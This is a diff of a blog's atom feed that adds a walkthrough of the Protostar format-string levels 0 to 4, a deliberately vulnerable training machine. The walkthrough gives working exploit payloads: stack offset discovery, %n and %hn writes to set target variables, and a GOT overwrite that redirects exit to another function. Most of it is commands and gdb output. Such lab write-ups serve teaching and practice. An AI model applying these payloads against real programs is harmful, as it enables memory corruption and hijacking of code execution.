@@ -4,7 +4,7 @@
   <title><![CDATA[Category: protostar | forelsec]]></title>
   <link href="http://hatRiot.github.io/blog/categories/protostar/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2014-09-06T11:57:32-06:00</updated>
+  <updated>2014-09-16T22:47:35-06:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -12,6 +12,275 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Protostar solutions - Format String]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings/"/>
+    <updated>2014-09-16T15:10:04-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings</id>
+    <content type="html"><![CDATA[<p>Wow it&rsquo;s been awhile since I&rsquo;ve taken a look at this box.  The last time I was here, I was working on the format string levels.  These levels have been done and documented to death, but hey, they&rsquo;re fun.  So, without further delay, lets begin.</p>
+
+<p>I&rsquo;ll be assuming you know what a format string is, and if not, you can follow allowing with <a href="http://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf">this</a> great paper.</p>
+
+<h2>Format String Level 00</h2>
+
+<p>This level really just points out that vulnerabilities exist in <code>sprintf</code>, and isn&rsquo;t too different from any of the easier stack levels.  All we&rsquo;ve got to do is overwrite an integer on the stack with 0xdeadbeef.  A 64 byte buffer is allocated, our target integer is assigned to 0 (after the allocated buffer), and <code>snprintf</code> invoked.  So 64 bytes of junk followed by 4 bytes should give us&hellip;</p>
+
+<p>```
+(gdb) r $(python -c &ldquo;print &lsquo;A&rsquo;<em>64 + &lsquo;\xef\xbe\xad\xde&rsquo;&rdquo;)
+Starting program: /opt/protostar/bin/format0 $(python -c &ldquo;print &lsquo;A&rsquo;</em>64 + &lsquo;\xef\xbe\xad\xde&rsquo;&rdquo;)</p>
+
+<p>Breakpoint 1, vuln (string=0xbffff95f &lsquo;A&rsquo; <repeats 64 times>, &ldquo;ﾭ&rdquo;, <incomplete sequence \336>) at format0/format0.c:15
+15  in format0/format0.c
+(gdb) x/wx &amp;target
+0xbffff75c: 0xdeadbeef
+(gdb) x/wx &amp;target-4
+0xbffff74c: 0x41414141
+(gdb) c
+Continuing.
+you have hit the target correctly :)
+```</p>
+
+<h2>Format String Level 01</h2>
+
+<p>Here&rsquo;s the first real format string vulnerability.  In it, <code>printf</code> is called without formatting specifiers, leading to a real format string vulnerability.  Our objective, like before, is to simply overwrite a static target variable, <code>target</code>, with anything.  Due to the variable not being on the local stack frame, we need to overwrite a specific address.  Let&rsquo;s first try and find that variable:</p>
+
+<p><code>
+user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
+08049638 g     O .bss   00000004              target
+user@protostar:/opt/protostar/bin$
+</code></p>
+
+<p>Note that ASLR/PIE is disabled on the system, so we can safely use this address as our writable target.  Now in order to actually write something to this address, we need to traverse the stack until we reach our controlled data, then use the <code>%n</code> to write the number of bytes written into a pointer found on the stack, our data.  I wrote a little script to help me find the offset:</p>
+
+<p>```
+import sys
+from commands import getoutput</p>
+
+<p>run = &ldquo;/opt/protostar/bin/format1 $(perl -e &lsquo;print \"AAAAAAAA\&rdquo; . \&ldquo;%08x.\"x{0}&rsquo; . \&rdquo;%x\&ldquo;)&rdquo;</p>
+
+<p>print &lsquo;[!] Searching for offset..&rsquo;
+for idx in range(1, 15000):</p>
+
+<pre><code>tmp = getoutput(run.format(idx))
+tmps = tmp.split('.')[:-1]
+if '41414141' in tmps[len(tmps)-1]:
+    print '[!] Format found at offset %d' % idx 
+    print '[!] String: %s' % run.format(idx)
+    break
+</code></pre>
+
+<p>```</p>
+
+<p>We accommodate for misaligned addresses by supplying 8 bytes and searching for 4.  When this runs, we get our offset:</p>
+
+<p><code>
+user@protostar:/opt/protostar/bin$ python ~/test.py
+[!] Searching for offset..
+[!] Format found at offset 133
+[!] String: /opt/protostar/bin/format1 $(perl -e 'print "AAAAAAAA" . "%08x."x133' . "%x")
+user@protostar:/opt/protostar/bin$
+</code></p>
+
+<p>All we need to do is get the alignment right, and we&rsquo;ve got our address:</p>
+
+<p>```
+(gdb) r $(perl -e &lsquo;print &ldquo;\x38\x96\x04\x08BAAAA&rdquo; . &ldquo;%08x."x132 . &rdquo;%n"&rsquo;)
+[snip]
+Breakpoint 1, vuln (</p>
+
+<pre><code>                string=0xbffff704 "8\226\004\bBAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%"...) at format1/format1.c:12
+</code></pre>
+
+<p>12  format1/format1.c: No such file or directory.</p>
+
+<pre><code>in format1/format1.c
+(gdb) x/wx &amp;target
+0x8049638 &lt;target&gt;: 0x000004ad
+(gdb) c
+Continuing.
+1.0000000f.bffff6db.00000000.00000000.d2000000.3398faa1.0022db30.da5bc6eb.6944a17d.00363836.00000000.00000000.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.00317461.you have modified the target :)
+</code></pre>
+
+<p>```</p>
+
+<p>Note we replace the <code>%x</code> at the end with a <code>%n</code>, thus allowing us to write bytes into the specified address.</p>
+
+<h2>Format String Level 02</h2>
+
+<p>The learning curve after level 1 is much lower for the remaining two levels.  This level is identical to 1, except we need to actually write a specific value (0x64).  Let&rsquo;s begin by first finding our target address:</p>
+
+<p><code>
+$ objdump -t format2 | grep target
+080496e4 g     O .bss   00000004              target
+</code></p>
+
+<p>Modifying my script a bit (since input is now via fgets):</p>
+
+<p><code>
+$ python /home/user/test.py
+[!] Searching for offset..
+[!] Format found at offset 4
+[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format2
+</code></p>
+
+<p>Not so far up the stack this time.  Lets plug in our address:</p>
+
+<p><code>
+$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%x."x3 . "%n"') | /opt/protostar/bin/format2
+��200.b7fd8420.bffff604.
+target is 26 :(
+</code></p>
+
+<p>Not quite there.  Recall that we&rsquo;re writing the number of bytes printed; so we just need to jack up our output formatter, and&hellip;</p>
+
+<p><code>
+$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%19x."x3 . "%n"') | /opt/protostar/bin/format2
+��                200.           b7fd8420.           bffff604.
+you have modified the target :)
+</code></p>
+
+<h2>Format String Level 03</h2>
+
+<p>This level requires us to more accurately write specific data to an address; lets again find our target:</p>
+
+<p><code>
+$ objdump -t format3 | grep target
+080496f4 g     O .bss   00000004              target
+</code></p>
+
+<p>And again running our script:</p>
+
+<p><code>
+$ python /home/user/test.py
+[!] Searching for offset..
+[!] Format found at offset 12
+[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x12' . "%x") | /opt/protostar/bin/format3
+</code></p>
+
+<p>And if we test this out:</p>
+
+<p><code>
+$ python -c 'print "\xf4\x96\x04\x08" + "%x."*11 + "%n"' | /opt/protostar/bin/format3
+��0.bffff5c0.b7fd7ff4.0.0.bffff7c8.804849d.bffff5c0.200.b7fd8420.bffff604.
+target is 0000004c :(
+</code></p>
+
+<p>So we&rsquo;ve validated we can modify the target, but we need to modify all 4 bytes.  At this point, I discovered that we could simply continue to add on data to the value, pop out, and write another byte.  This, however, was tedious, and filled up my command line quickly.  It was at this point that I switched to using direct parameter access symbols.  Essentially, this allows us to directly access a variable from the stack, without having to continually pop values from it.  For example, if we wanted to access the 11th parameter, we would simply use <code>%11$x</code>.  If we return briefly to format1, we can see this in action below:</p>
+
+<p><code>
+$ ./format1 $(perl -e 'print "AAAAAA"')'_%128$x';printf "\n"
+AAAAAA_41414141
+</code></p>
+
+<p>This is a much cleaner way of reading values off the stack.  Testing this on level 3:</p>
+
+<p><code>
+$ python -c 'print "AAAABBBBCCCCDDDD" + "_%12$x_%13$x_%14$x_%15$x"' | ./format3
+AAAABBBBCCCCDDDD_41414141_42424242_43434343_44444444
+target is 00000000 :(
+</code></p>
+
+<p>And to verify we&rsquo;re there, we can substitute the characters for addresses, and replace the <code>$x</code> with a <code>$n</code> to write into those addresses:</p>
+
+<p><code>
+$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%12$n%13$n%14$n%15$n"' | ./format3
+��������
+target is 10101010 :(
+</code></p>
+
+<p>Figuring out the correct padding values requires some simple math:</p>
+
+<p><code>
+first byte = 0x44 - 0x10
+second     = 0x55 - 0x44
+third      = 0x02 - 0x55
+</code></p>
+
+<p>Note we&rsquo;ve left off the fourth byte, we&rsquo;ll return to this in a second.  Simple math tells us that the first byte padding value should be 52:</p>
+
+<p><code>
+$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%13$x%14$x%15$x"' | ./format3
+��������                                                   080496f580496f680496f7
+target is 00000044 :(
+</code></p>
+
+<p>The second byte is 17, and the third byte is -83, but if we wrap that we get 173 (0x02 &ndash; 0x55 &amp; 0xff).  This results in:</p>
+
+<p><code>
+$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%17u%13$n%173u%14$n%15$x"' | ./format3
+��������                                                   0       3221222896                                                                                                                                                                   308684389280496f7
+you have modified the target :)
+</code></p>
+
+<p>As noted earlier, we don&rsquo;t actually have to write anything to the final byte, as it is set due to a previous overflow.</p>
+
+<h2>Format String Level 04</h2>
+
+<p>The final level in the format string section, this one requires us to redirect execution to another method, <code>hello</code>.  This probably means we&rsquo;ll need to overwrite a value in the GOT, or the Global Offset Table, which acts as a trampoline for dynamic libraries.  Let&rsquo;s start by finding the hello function that we want to redirect execution flow to:</p>
+
+<p><code>
+$ objdump -M intel -t format4 | grep hello
+080484b4 g     F .text  0000001e              hello
+</code></p>
+
+<p>And running our script:</p>
+
+<p><code>
+$ python /home/user/test.py
+[!] Searching for offset..
+[!] Format found at offset 4
+[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format4
+</code></p>
+
+<p>If we take a look at the <a href="http://webcache.googleusercontent.com/search?q=cache:KFYMJlYdHdMJ:exploit-exercises.com/protostar/format4+&amp;cd=3&amp;hl=en&amp;ct=clnk&amp;gl=us">code</a>, we see a call to exit right after the vulnerable printf.  This is the entry we want to overwrite.  We now need that address:</p>
+
+<p><code>
+$ objdump --dynamic-reloc format4 | grep exit
+08049718 R_386_JUMP_SLOT   _exit
+08049724 R_386_JUMP_SLOT   exit
+</code></p>
+
+<p>So we need to overwrite 0x08049724 with 0x080484b4.  Let&rsquo;s give this a shot:</p>
+
+<p>```
+user@protostar:/opt/protostar/bin$ python -c &lsquo;print &ldquo;\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08&rdquo; + &ldquo;%4$n%5$n%6$n%7$n&rdquo;&rsquo; > /tmp/input
+user@protostar:/opt/protostar/bin$ gdb -q ./format4
+Reading symbols from /opt/protostar/bin/format4&hellip;done.
+(gdb) r &lt; /tmp/input
+Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
+$�%�&amp;�'�</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+0x10101010 in ?? ()
+(gdb)
+```</p>
+
+<p>We&rsquo;ve verified we&rsquo;re at the right location and can control EIP; notice, however, that the two addresses only differ by 2 bytes.  If we use the <code>$hn</code>, or a short 2 byte write, we can get by with less code:</p>
+
+<p>```
+user@protostar:/opt/protostar/bin$ python -c &lsquo;print &ldquo;\x24\x97\x04\x08&rdquo; + &ldquo;%4$hn&rdquo;&rsquo; > /tmp/input
+user@protostar:/opt/protostar/bin$ gdb -q ./format4
+Reading symbols from /opt/protostar/bin/format4&hellip;done.
+(gdb) r &lt; /tmp/input
+Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
+$�</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+0x08040004 in ?? ()
+```</p>
+
+<p>More simple math, <code>p/d 0x84b4 - 0x0004</code>, gives us 33968.</p>
+
+<p><code>
+$ python -c 'print "\x24\x97\x04\x08" + "%33968u%4$hn"' | ./format4
+[snip whitespace]
+code execution redirected! you win
+</code></p>
+
+<p>And that&rsquo;s it!  Next up, heap exploitation.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Protostar solutions - Stack Levels]]></title>
